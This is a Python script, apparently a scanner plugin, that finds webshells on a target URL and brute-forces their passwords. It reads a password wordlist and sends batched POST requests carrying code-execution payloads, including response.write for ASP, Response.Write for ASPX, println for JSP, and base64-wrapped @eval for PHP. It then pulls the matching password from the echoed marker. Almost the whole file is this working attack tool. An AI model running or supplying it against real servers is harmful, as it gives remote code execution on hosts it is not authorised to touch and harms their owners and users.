import re
import time
import requests
from fake_useragent import UserAgent
import base64

Timeout = 10
ua = UserAgent()
headers = {
    'User-Agent': ua.random
}
pwd = []

with open(r".\poc\webshell\PW.txt", 'r')as p:
# with open(r"PW.txt", 'r')as p:
    pwd_list = p.readlines()
    dic = len(pwd_list) / 1000
    for pw in pwd_list:
        pw = pw.strip()
        pwd.append(pw)


def poc(url):
    post_data = {}
    global find
    proxies = {'http': '127.0.0.1:9999'}
    try:
        req = requests.get(url, headers=headers, timeout=Timeout, allow_redirects=False)
        sub = re.findall(r'(<input.*?>)', req.text)
        code = req.status_code
        if code == 200 or code == 500:
            if "name='pass'" in str(sub) or "name='envlpass'" in str(sub):
                find = "目标存在 Xebshell 目标url: %s   %s" % (url, '存在误报')
                return find
            if "type='submit'" in str(sub):
                find = "目标存在 Xebshell 目标url: %s   %s" % (url, '存在误报')
                return find
            if '.asp' in url.lower():
                post_test = {'test_pass_test': 'response.write("test!!!")'}
                res = requests.post(url, data=post_test, timeout=Timeout, headers=headers)
                wrong_res = res.text
                post_test.clear()
                for i in range(0, int(dic) + 1):
                    for text in pwd[i * 1000:(i + 1) * 1000]:
                        post_data[text] = 'response.write("<|-password is %s-|>")' % text
                    response = requests.post(url, data=post_data, headers=headers, timeout=Timeout,)
                    post_data.clear()
                    time.sleep(1)
                    if len(response.text) != len(wrong_res):
                        if '"<|-password' not in response.text:
                            if '<|-password' in response.text:
                                pattern = re.search(r'[<][|][-](.*?)[-][|][>]', response.text)
                                find = "目标存在 Webshell 目标url: %s   %s" % (url, str(pattern.group(1)))
                                return find
            if '.aspx' in url.lower():
                post_test = {'test_pass_test': 'Response.Write("test!!!");'}
                res = requests.post(url, data=post_test, timeout=Timeout, headers=headers)
                wrong_res = res.text
                post_test.clear()
                for i in range(0, int(dic) + 1):
                    for text in pwd[i * 1000:(i + 1) * 1000]:
                        post_data[text] = 'Response.Write("<|-password is %s-|>");' % text
                    # print(post_data)
                    response = requests.post(url, data=post_data, headers=headers, timeout=Timeout)
                    post_data.clear()
                    time.sleep(1)
                    if len(response.text) != len(wrong_res):
                        if '"<|-password' not in response.text:
                            if '<|-password' in response.text:
                                pattern = re.search(r'[<][|][-](.*?)[-][|][>]', response.text)
                                find = "目标存在 Webshell 目标url: %s   %s" % (url, str(pattern.group(1)))
                                return find
            if '.jsp' in url.lower():
                post_test = {'test_pass_test': 'System.out.println("test!!!");'}
                res = requests.post(url, data=post_test, headers=headers, timeout=Timeout)
                wrong_res = res.text
                post_test.clear()
                for i in range(0, int(dic) + 1):
                    for text in pwd[i * 1000:(i + 1) * 1000]:
                        post_data[text] = 'System.out.println("<|-password is %s-|>");' % text
                    response = requests.post(url, data=post_data, headers=headers, timeout=Timeout)
                    post_data.clear()
                    time.sleep(1)
                    if len(response.text) != len(wrong_res):
                        if '<|-password' in response.text:
                            pattern = re.search(r'[<][|][-](.*?)[-][|][>]', response.text)
                            find = "目标存在 Webshell 目标url: %s   %s" % (url, str(pattern.group(1)))
                            return find

            if '.php' in url.lower():
                post_test = {
                    'test_pass_test': "@eval(base64_decode('ZWNobygicGFzc3dvcmQgaXMgdGVzdF9wYXNzX3Rlc3QiKTs='));"
                }
                res = requests.post(url, data=post_test, headers=headers, timeout=Timeout)
                wrong_res = res.text
                post_test.clear()
                for i in range(0, int(dic) + 1):
                    for text in pwd[i * 1000:(i + 1) * 1000]:
                        aa = "<|-password is %s-|>" % text
                        aaa = "echo('" + aa + "');"
                        aaaa = base64.b64encode(aaa.encode('utf-8'))
                        poc = "@eval(base64_decode('" + str(aaaa, 'utf-8') + "'));"
                        post_data[text] = poc
                    # print('------------>%s' % i, post_data)
                    response = requests.post(url, data=post_data, headers=headers, timeout=Timeout, )
                    post_data.clear()
                    time.sleep(1)
                    if len(response.text) != len(wrong_res):
                        if '<|-password' in response.text:
                            pattern = re.search(r'[<][|][-](.*?)[-][|][>]', response.text)
                            find = "目标存在 Webshell 目标url: %s   %s" % (url, str(pattern.group(1)))
                            return find
    except:
        pass


if __name__ == "__main__":
    a = poc('http://127.0.0.1/data.asp')
    print(a)